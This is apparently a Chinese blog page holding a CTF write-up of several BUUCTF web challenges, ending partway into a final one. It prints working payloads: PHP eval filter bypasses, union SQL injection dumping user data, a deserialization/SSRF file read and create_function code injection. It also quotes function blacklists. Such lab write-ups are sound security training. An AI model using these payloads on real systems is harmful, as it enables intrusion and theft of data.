@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -write up -ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言刷题没啥好说的，因为懒就没截图了，尽量说的清楚些。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu练习2">
+<meta property="og:url" content="http://example.com/2022/02/21/buu%E7%BB%83%E4%B9%A02/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言刷题没啥好说的，因为懒就没截图了，尽量说的清楚些。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-21T12:23:38.000Z">
+<meta property="article:modified_time" content="2022-02-22T10:46:29.062Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -write up -ctf">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/02/21/buu练习2/"/>
+
+
+
+
+
+  <title>buu练习2 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/21/buu%E7%BB%83%E4%B9%A02/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">buu练习2</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-02-21T20:23:38+08:00">
+                2022-02-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题没啥好说的，因为懒就没截图了，尽量说的清楚些。</p>
+<span id="more"></span>
+
+<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进网页是个计算器，但是看js发现<code>calc.php</code>，进入发现源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>但是num参数只能传入数字，因此我们要绕过waf。方法就是在GET时问好后面加一个空格，这里用到了PHP的字符串解析特性。php解析时会把空白符删除，接着用<code>chr()</code>绕过其他waf内容就行了。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">? num=var_dump(scandir(chr(47))) //扫描根目录</span><br><span class="line">? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) //列出flag</span><br></pre></td></tr></table></figure>
+
+<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>信息收集发现<code>robots.txt</code>泄露源码，审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = (int)$age;</span><br><span class="line">        $this-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode == 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog = $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现curl()，怀疑考察ssrf，寻找$url的注入点，登陆后发现<code>view.php</code>界面下存在注入点，进行测试，万能密码测试发现存在sql注入，报错注入查询数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//查库</span><br><span class="line">?no=233/**/union/**/select/**/1,database(),3,4--+</span><br><span class="line">fakebook</span><br><span class="line"></span><br><span class="line">//查表</span><br><span class="line">?no=233/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()--+</span><br><span class="line">users</span><br><span class="line"></span><br><span class="line">//查列名</span><br><span class="line">?no=233/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_schema=&#x27;fakebook&#x27;/**/and/**/table_name=&#x27;users&#x27;--+</span><br><span class="line">no,username,passwd,data</span><br><span class="line"></span><br><span class="line">//查数据</span><br><span class="line">?no=233/**/union/**/select/**/1,group_concat(no,username,passwd,data),3,4/**/from/**/users--+</span><br><span class="line">1</span><br><span class="line">mrl64</span><br><span class="line">ba3253876aed6bc22d4a6ff53d8406c6ad864195ed144ab5c87621b6c233b548baeae6956df346ec8c17f5ea10f35ee3cbc514797ed7ddd3145464e2a0bab413</span><br><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:3:&quot;age&quot;;i:233;s:4:&quot;blog&quot;;s:15:&quot;mrl64.ahaha.com&quot;;&#125; </span><br></pre></td></tr></table></figure>
+
+<p>发现data中序列化内容，利用源码中的反序列化进行注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name = &quot;&quot;;</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $blog = &quot;file:///var/www/html/flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new UserInfo();</span><br><span class="line">echo serialize($a);</span><br><span class="line"></span><br><span class="line">//O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=233/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;hacker&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>因为缺乏对应的知识这题想了挺久的，也是看了wp才学到的。进入网页是一个登陆页面，下面有个help，点进help发现url存疑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://c9fafc43-ee05-4188-981e-dff5ae10fed7.node4.buuoj.cn:81/Download?filename=help.docx</span><br></pre></td></tr></table></figure>
+
+<p>将GET传值改为POST后发现可以下载文件，但是flag不存在<code>help.docx</code>中，查询各种资料后发现这里要用到一个信息泄露：</p>
+<blockquote>
+<p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
+</blockquote>
+<p>因此我们POST值获取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
+
+<p>查看文件找到flag目录，直接下载后解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://c9fafc43-ee05-4188-981e-dff5ae10fed7.node4.buuoj.cn:81/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br><span class="line">//改为POST传值</span><br></pre></td></tr></table></figure>
+
+<h1 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h1><p>审查元素发现提示，base32解码结果为<code>1nD3x.php</code>，访问页面查看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">$file = &quot;1nD3x.php&quot;;</span><br><span class="line">$shana = $_GET[&#x27;shana&#x27;];</span><br><span class="line">$passwd = $_GET[&#x27;passwd&#x27;];</span><br><span class="line">$arg = &#x27;&#x27;;</span><br><span class="line">$code = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if($_SERVER) &#123; </span><br><span class="line">    if (</span><br><span class="line">        preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">        )  </span><br><span class="line">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br><span class="line"></span><br><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg); </span><br><span class="line">&#125; ?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>一步一步审计，第一步要绕过<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，这个函数不会进行urldecode，因此可以用url编码绕过。<br>第二步要绕过<code>preg_match(&#39;/^$/&#39;)</code>，这里用换行符绕过。<br>第三步<code>$_REQUEST</code>绕过，这里是根据POST优先级高于GET来绕过的。<br>第四步<code>file_get_contents</code>，老朋友伪协议就完事了。<br>第五步<code>sha1()</code>比较，数组就可以了。</p>
+<p>因此构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</span><br><span class="line">POST:file=1&amp;debu=1</span><br></pre></td></tr></table></figure>
+
+<p>最后是第六步，我们发现<code>$code</code>和<code>$arg</code>是可控的，这里可以使用<code>create_function()</code>来绕过。</p>
+<p><code>create_function()</code>范例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$mrl64 = create_function(&#x27;$a,$b&#x27;,&#x27;return $a + &amp;b&#x27;)</span><br><span class="line"></span><br><span class="line">等价于</span><br><span class="line"></span><br><span class="line">function mrl64($a,$b)&#123;</span><br><span class="line">    return $a+$b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用这个函数，我们可以构建<code>$code(&#39;&#39;,$arg)</code>来进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">等价于</span><br><span class="line">function a(&#x27;&#x27;,$arg)&#123;</span><br><span class="line">    return &#125;var_dump(get_defined_vars());//</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这样构建的思路就是闭合a函数，并且跟上执行代码，最后用注释符将后面的内容注释掉。</p>
+<p>读取到flag在<code>rea1fl4g.php</code>中，且用require读取，用取反绕过正则，最终payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//</span><br><span class="line">POST:debu=1&amp;file=1</span><br></pre></td></tr></table></figure>
+
+<h1 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h1><p>这题按题目看是XXE，但是用xml配合伪协议读取源码没有发现什么有效内容，用源码中的账号密码也没有有用信息。思考XXE可以用来打内网，寻找存活主机，搜索<code>/etc/hosts</code>没有找到有效信息，看了wp知道了这里要读取<code>/proc/net/arp</code>文件，找到<code>10.128.253.12</code>。</p>
+<p>直接访问会报错，尝试爆破c段，最后爆破出正确网段，获取flag。</p>
+<h1 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h1><p>题目给了源码，直接审计：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64)); //生成一个随机数</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;]; </span><br><span class="line">  if (hash_equals($secret, $guess)) &#123; //比较guess与secret</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们是不可能猜出来这个随机数的，因此下半部分的代码基本没用，重要的部分在上面。</p>
